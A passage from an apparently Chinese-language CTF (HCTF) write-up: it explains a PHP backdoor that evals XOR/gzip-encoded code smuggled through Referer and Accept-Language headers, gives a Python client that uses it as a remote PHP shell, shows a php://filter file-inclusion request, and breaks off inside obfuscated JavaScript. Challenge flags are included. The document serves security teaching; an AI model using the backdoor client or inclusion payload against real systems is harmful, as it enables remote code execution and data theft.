class="number">1</span>]); $i++)</span><br><span class="line">            <span class="comment">// 取出所有的权重数字作为在query里的payload参数</span></span><br><span class="line">            <span class="comment">// 例如从fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5取出&quot;0&quot;, &quot;1&quot; 和 &quot;2&quot;，并且在query里寻找第0，第1和第2个参数</span></span><br><span class="line">            $payload .= $query[$matched[<span class="number">2</span>][$i]];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果payload以head开头</span></span><br><span class="line">        <span class="keyword">if</span>(strpos($payload, $head) === <span class="number">0</span>) &#123;</span><br><span class="line">            $_SESSION[$user] = <span class="string">&quot;&quot;</span>;  <span class="comment">// 清空session[&quot;ff&quot;]</span></span><br><span class="line">            $payload = substr($payload, <span class="number">3</span>);  <span class="comment">// 从payload的开头中剪掉head</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果user有session，即payload以head开头</span></span><br><span class="line">        <span class="keyword">if</span>(array_key_exists($user, $_SESSION)) &#123;</span><br><span class="line">            $_SESSION[$user] .= $payload;  <span class="comment">// 获取payload</span></span><br><span class="line">            <span class="comment">// 根据tail标识符找到payload结尾</span></span><br><span class="line">            $pos = strpos($_SESSION[$user], $tail);</span><br><span class="line">            <span class="keyword">if</span>($pos) &#123;</span><br><span class="line">                <span class="comment">// 异或用的key</span></span><br><span class="line">                $key = $kh.$kf;</span><br><span class="line"></span><br><span class="line">                ob_start();</span><br><span class="line">                $payload = substr($_SESSION[$user], <span class="number">0</span>, $pos);  <span class="comment">// 截取payload，从这里开始的paylaod就是去除了head和tail的</span></span><br><span class="line">                $payload = preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>), $payload);  <span class="comment">// 将_和-替换为/和+</span></span><br><span class="line">                $payload = @base64_decode($payload);  <span class="comment">// base64解码</span></span><br><span class="line">                $payload = @_xor($payload, $key);  <span class="comment">// 异或解密</span></span><br><span class="line">                $payload = @gzuncompress($payload);  <span class="comment">// 解压缩</span></span><br><span class="line">                @<span class="keyword">eval</span>($payload);  <span class="comment">// 执行代码</span></span><br><span class="line">                $output = ob_get_contents(); <span class="comment">// 获取执行结果</span></span><br><span class="line">                ob_end_clean();</span><br><span class="line">                <span class="comment">// 将执行结果压缩，异或加密，base64编码后输出到网页中</span></span><br><span class="line">                $output = base64_encode(_xor(gzcompress($output),$key));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$key</span>&gt;<span class="subst">$output</span>&lt;/<span class="subst">$key</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说原理就是先用accept language里提取出每个权重的首字母和权重数字，将前两个权重首字母作为用户的标识，将所有的权重数字作为payload数组的下标，payload分开以数组的方式存放在referer的查询里，并且payload要以用户标识加kh的MD5前三位开头，以用户表示加kf的MD5的前三位结尾。</p><p>编写利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23332/backdoor.php&#x27;</span></span><br><span class="line">kh = <span class="string">&#x27;d03a&#x27;</span></span><br><span class="line">kf = <span class="string">&#x27;1f3c&#x27;</span></span><br><span class="line">key = kh + kf</span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len(content):</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt; len(key) <span class="keyword">and</span> i &lt; len(content):</span><br><span class="line">            result += chr(ord(content[i]) ^ ord(key[j]))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>(<span class="params">code</span>):</span></span><br><span class="line">    head = hashlib.md5(<span class="string">&#x27;ff&#x27;</span> + kh).hexdigest()[:<span class="number">3</span>]</span><br><span class="line">    tail = hashlib.md5(<span class="string">&#x27;ff&#x27;</span> + kf).hexdigest()[:<span class="number">3</span>]</span><br><span class="line">    payload = zlib.compress(code)</span><br><span class="line">    payload = xor(payload, key)</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://evil.com/?a=%s&amp;b=%s&amp;c=%s&#x27;</span> % (head, payload, tail),</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = sess.get(url, headers=headers).content</span><br><span class="line">    result = re.findall(<span class="string">&#x27;&lt;%s&gt;(.*?)&lt;/%s&gt;&#x27;</span> % (key, key), result)[<span class="number">0</span>]</span><br><span class="line">    result = base64.b64decode(result)</span><br><span class="line">    result = xor(result, key)</span><br><span class="line">    result = zlib.decompress(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">print</span> hack(raw_input(<span class="string">&#x27;php&gt; &#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后得到flag为<br><code>flag&#123;Y0U_r_brave_t0_so1ve_probl3M&#125;</code></p><hr><h1 id="Global-Page-175"><a href="#Global-Page-175" class="headerlink" title="Global Page(175)"></a>Global Page(175)</h1><p>随便点一个page，在Warning里面显示了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(pwn&#x2F;zh-CN.php): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 39</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#39;pwn&#x2F;zh-CN.php&#39; for inclusion (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#39;) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 39</span><br></pre></td></tr></table></figure><p>所以是一个文件包含，根据输入的page包含一个page/zh-CN.php的文件，用php伪协议读掩码，%00截断后面的/zh-CN.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php%00</span><br></pre></td></tr></table></figure><p>但是发现过滤了“/”和“.”，并且无法使用%00截断，所以不能通过page进行文件包含，但是可以发现page后面的/zh-CH.php刚好是accept-language里面的语言，因此就可以通过修改accept-language进行文件包含，发送请求包如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?page&#x3D;php: HTTP&#x2F;1.1</span><br><span class="line">Host: vps1.blue-whale.me:23334</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.132 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将因为存在page参数才会开始包含，但是page里不能含有“/”，因此可以将page设置为“php:”，在Accept-Language里设置为“/filter/read=convert.base64-encode/resource=index;q=0.8”即可包含到index源码，源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;display_errors&#39;, 1);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;utf-8&gt;</span><br><span class="line">&lt;title&gt;Global Page&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.rtl &#123;</span><br><span class="line">  direction: rtl;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$dir &#x3D; &quot;&quot;;</span><br><span class="line">if(isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">    $dir &#x3D; str_replace([&#39;.&#39;, &#39;&#x2F;&#39;], &#39;&#39;, $_GET[&#39;page&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($dir)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href&#x3D;&quot;.&#x2F;?page&#x3D;pwn&quot;&gt;Pwn&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;&lt;del&gt;Tokyo Westerns&lt;&#x2F;del&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href&#x3D;&quot;.&#x2F;?page&#x3D;ctf&quot;&gt;CTF&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    foreach(explode(&quot;,&quot;, $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]) as $lang) &#123;</span><br><span class="line">        $l &#x3D; trim(explode(&quot;;&quot;, $lang)[0]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;p&lt;?&#x3D;($l&#x3D;&#x3D;&#x3D;&#39;he&#39;)?&quot; class&#x3D;rtl&quot;:&quot;&quot;?&gt;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        include &quot;$dir&#x2F;$l.php&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>最后包含flag.php获取flag<br><code>flag&#123;i_f0und_SiMp13_LFI_gogogo&#125;</code></p><hr><h1 id="BabyCrack-200"><a href="#BabyCrack-200" class="headerlink" title="BabyCrack(200)"></a>BabyCrack(200)</h1><p>类似FxxkingBackdoor，是JavaScript的反混淆，给一个输入需要符合一定条件才会得到flag，而整个解密输入的逻辑都在一个js文件中，在网页源码里拿到最开始的源码=_=.js如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a=[<span class="string">&#x27;random&#x27;</span>,<span class="string">&#x27;charCodeAt&#x27;</span>,<span class="string">&#x27;fromCharCode&#x27;</span>,<span class="string">&#x27;parse&#x27;</span>,<span class="string">&#x27;substr&#x27;</span>,<span class="string">&#x27;\x5cw+&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>,<span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>,<span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;length&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;getElementById&#x27;</span>,<span class="string">&#x27;message&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>,<span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>,<span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>,<span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>,<span class="string">&#x27;version&#x27;</span>,<span class="string">&#x27;error&#x27;</span>,<span class="string">&#x27;download&#x27;</span>,<span class="string">&#x27;substring&#x27;</span>,<span class="string">&#x27;push&#x27;</span>,<span class="string">&#x27;Function&#x27;</span>,<span class="string">&#x27;charAt&#x27;</span>,<span class="string">&#x27;idle&#x27;</span>,<span class="string">&#x27;pyW5F1U43VI&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;https://the-extension.com&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;storage&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;then&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;getTime&#x27;</span>,<span class="string">&#x27;setUTCHours&#x27;</span>,<span class="string">&#x27;origin&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;loading&#x27;</span>,<span class="string">&#x27;status&#x27;</span>,<span class="string">&#x27;removeListener&#x27;</span>,<span class="string">&#x27;onUpdated&#x27;</span>,<span class="string">&#x27;callee&#x27;</span>,<span class="string">&#x27;addListener&#x27;</span>,<span class="string">&#x27;onMessage&#x27;</span>,<span class="string">&#x27;runtime&#x27;</span>,<span class="string">&#x27;executeScript&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;http://&#x27;</span>,<span class="string">&#x27;Url\x20error&#x27;</span>,<span class="string">&#x27;query&#x27;</span>,<span class="string">&#x27;filter&#x27;</span>,<span class="string">&#x27;active&#x27;</span>,<span class="string">&#x27;floor&#x27;</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">_0xd4b7d6,_0xad25ab</span>)</span>&#123;<span class="keyword">var</span> _0x5e3956=<span class="function"><span class="keyword">function</span>(<span class="params">_0x1661d3</span>)</span>&#123;<span class="keyword">while</span>(--_0x1661d3)&#123;_0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;_0x5e3956(++_0xad25ab);&#125;(_0x180a,<span class="number">0x1a2</span>));<span class="keyword">var</span> _0xa180=<span class="function"><span class="keyword">function</span>(<span class="params">_0x5c351c,_0x2046d8</span>)</span>&#123;_0x5c351c=_0x5c351c<span class="number">-0x0</span>;<span class="keyword">var</span> _0x26f3b3=_0x180a[_0x5c351c];<span class="keyword">return</span> _0x26f3b3;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">_0x5b7c0c</span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x2e2f8d=[<span class="string">&#x27;code&#x27;</span>,_0xa180(<span class="string">&#x27;0x0&#x27;</span>),_0xa180(<span class="string">&#x27;0x1&#x27;</span>),_0xa180(<span class="string">&#x27;0x2&#x27;</span>),<span class="string">&#x27;invalidMonetizationCode&#x27;</span>,_0xa180(<span class="string">&#x27;0x3&#x27;</span>),_0xa180(<span class="string">&#x27;0x4&#x27;</span>),_0xa180(<span class="string">&#x27;0x5&#x27;</span>),_0xa180(<span class="string">&#x27;0x6&#x27;</span>),_0xa180(<span class="string">&#x27;0x7&#x27;</span>),_0xa180(<span class="string">&#x27;0x8&#x27;</span>),_0xa180(<span class="string">&#x27;0x9&#x27;</span>),_0xa180(<span class="string">&#x27;0xa&#x27;</span>),_0xa180(<span class="string">&#x27;0xb&#x27;</span>),_0xa180(<span class="string">&#x27;0xc&#x27;</span>),_0xa180(<span class="string">&#x27;0xd&#x27;</span>),_0xa180(<span class="string">&#x27;0xe&#x27;</span>),_0xa180(<span class="string">&#x27;0xf&#x27;</span>),_0xa180(<span class="string">&#x27;0x10&#x27;</span>),_0xa180(<span class="string">&#x27;0x11&#x27;</span>),<span class="string">&#x27;url&#x27;</span>,_0xa180(<span class="string">&#x27;0x12&#x27;</span>),_0xa180(<span class="string">&#x27;0x13&#x27;</span>),_0xa180(<span class="string">&#x27;0x14&#x27;</span>),_0xa180(<span class="string">&#x27;0x15&#x27;</span>),_0xa180(<span class="string">&#x27;0x16&#x27;</span>),_0xa180(<span class="string">&#x27;0x17&#x27;</span>),_0xa180(<span class="string">&#x27;0x18&#x27;</span>),<span class="string">&#x27;tabs&#x27;</span>,_0xa180(<span class="string">&#x27;0x19&#x27;</span>),_0xa180(<span class="string">&#x27;0x1a&#x27;</span>),_0xa180(<span class="string">&#x27;0x1b&#x27;</span>),_0xa180(<span class="string">&#x27;0x1c&#x27;</span>),_0xa180(<span class="string">&#x27;0x1d&#x27;</span>),<span class="string">&#x27;replace&#x27;</span>,_0xa180(<span class="string">&#x27;0x1e&#x27;</span>),_0xa180(<span class="string">&#x27;0x1f&#x27;</span>),<span class="string">&#x27;includes&#x27;</span>,_0xa180(<span class="string">&#x27;0x20&#x27;</span>),<span class="string">&#x27;length&#x27;</span>,_0xa180(<span class="string">&#x27;0x21&#x27;</span>),_0xa180(<span class="string">&#x27;0x22&#x27;</span>),_0xa180(<span class="string">&#x27;0x23&#x27;</span>),_0xa180(<span class="string">&#x27;0x24&#x27;</span>),_0xa180(<span class="string">&#x27;0x25&#x27;</span>),_0xa180(<span class="string">&#x27;0x26&#x27;</span>),_0xa180(<span class="string">&#x27;0x27&#x27;</span>),_0xa180(<span class="string">&#x27;0x28&#x27;</span>),_0xa180(<span class="string">&#x27;0x29&#x27;</span>),<span class="string">&#x27;toString&#x27;</span>,_0xa180(<span class="string">&#x27;0x2a&#x27;</span>),<span class="string">&#x27;split&#x27;</span>];<span class="keyword">var</span> _0x50559f=_0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>,<span class="number">0x4</span>);<span class="keyword">var</span> _0x5cea12=<span class="built_in">parseInt</span>(btoa(_0x50559f),<span class="number">0x20</span>);<span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">_0x200db2,_0x177f13,_0x46da6f,_0x802d91,_0x2d59cf,_0x2829f2</span>)</span>&#123;_0x2d59cf=<span class="function"><span class="keyword">function</span>(<span class="params">_0x4be75f</span>)</span>&#123;<span class="keyword">return</span> _0x4be75f[<span class="string">&#x27;toString&#x27;</span>](_0x177f13);&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(_0x46da6f--)_0x2829f2[_0x2d59cf(_0x46da6f)]=_0x802d91[_0x46da6f]||_0x2d59cf(_0x46da6f);_0x802d91=[<span class="function"><span class="keyword">function</span>(<span class="params">_0x5e8f1a</span>)</span>&#123;<span class="keyword">return</span> _0x2829f2[_0x5e8f1a];&#125;];_0x2d59cf=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> _0xa180(<span class="string">&#x27;0x2b&#x27;</span>);&#125;;_0x46da6f=<span class="number">0x1</span>;&#125;;<span class="keyword">while</span>(_0x46da6f--)<span class="keyword">if</span>(_0x802d91[_0x46da6f])_0x200db2=_0x200db2[_0xa180(<span class="string">&#x27;0x2c&#x27;</span>)](<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span>+_0x2d59cf(_0x46da6f)+<span class="string">&#x27;\x5cb&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),_0x802d91[_0x46da6f]);<span class="keyword">return</span> _0x200db2;&#125;(_0xa180(<span class="string">&#x27;0x2d&#x27;</span>),<span class="number">0x11</span>,<span class="number">0x11</span>,_0xa180(<span class="string">&#x27;0x2e&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>),<span class="number">0x0</span>,&#123;&#125;));(<span class="function"><span class="keyword">function</span>(<span class="params">_0x3291b7,_0xced890</span>)</span>&#123;<span class="keyword">var</span> _0xaed809=<span class="function"><span class="keyword">function</span>(<span class="params">_0x3aba26</span>)</span>&#123;<span class="keyword">while</span>(--_0x3aba26)&#123;_0x3291b7[_0xa180(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;_0xaed809(++_0xced890);&#125;(_0x2e2f8d,_0x5cea12%<span class="number">0x7b</span>));<span class="keyword">var</span> _0x43c8d1=<span class="function"><span class="keyword">function</span>(<span class="params">_0x3120e0</span>)</span>&#123;<span class="keyword">var</span> _0x3120e0=<span class="built_in">parseInt</span>(_0x3120e0,<span class="number">0x10</span>);<span class="keyword">var</span> _0x3a882f=_0x2e2f8d[_0x3120e0];<span class="keyword">return</span> _0x3a882f;&#125;;<span class="keyword">var</span> _0x1c3854=<span class="function"><span class="keyword">function</span>(<span class="params">_0x52ba71</span>)</span>&#123;<span class="keyword">var</span> _0x52b956=<span class="string">&#x27;0x&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x59c050=<span class="number">0x0</span>;_0x59c050&lt;_0x52ba71[_0x43c8d1(<span class="number">0x8</span>)];_0x59c050++)&#123;_0x52b956+=_0x52ba71[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x59c050)[_0x43c8d1(<span class="number">0xc</span>)](<span class="number">0x10</span>);&#125;<span class="keyword">return</span> _0x52b956;&#125;;<span class="keyword">var</span> _0x76e1e8=_0x5b7c0c[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);<span class="keyword">var</span> _0x34f55b=(_0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>,<span class="number">0x2</span>))^_0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)))%_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)]==<span class="number">0x5</span>;<span class="keyword">if</span>(!_0x34f55b)&#123;<span class="keyword">return</span>![];&#125;b2c=<span class="function"><span class="keyword">function</span>(<span class="params">_0x3f9bc5</span>)</span>&#123;<span class="keyword">var</span> _0x3c3bd8=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;<span class="keyword">var</span> _0x4dc510=[];<span class="keyword">var</span> _0x4a199f=<span class="built_in">Math</span>[_0xa180(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)]/<span class="number">0x5</span>);<span class="keyword">var</span> _0x4ee491=_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)]%<span class="number">0x5</span>;<span class="keyword">if</span>(_0x4ee491!=<span class="number">0x0</span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> _0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;<span class="number">0x5</span>-_0x4ee491;_0x1e1753++)&#123;_0x3f9bc5+=<span class="string">&#x27;&#x27;</span>;&#125;_0x4a199f+=<span class="number">0x1</span>;&#125;<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x4a199f;_0x1e1753++)&#123;_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>)&gt;&gt;<span class="number">0x3</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>)&amp;<span class="number">0x7</span>)&lt;&lt;<span class="number">0x2</span>|_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&gt;&gt;<span class="number">0x6</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&amp;<span class="number">0x3f</span>)&gt;&gt;<span class="number">0x1</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&amp;<span class="number">0x1</span>)&lt;&lt;<span class="number">0x4</span>|_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x2</span>)&gt;&gt;<span class="number">0x4</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x2</span>)&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">0x1</span>|_0x3f9bc5[_0x43c8d1(<span 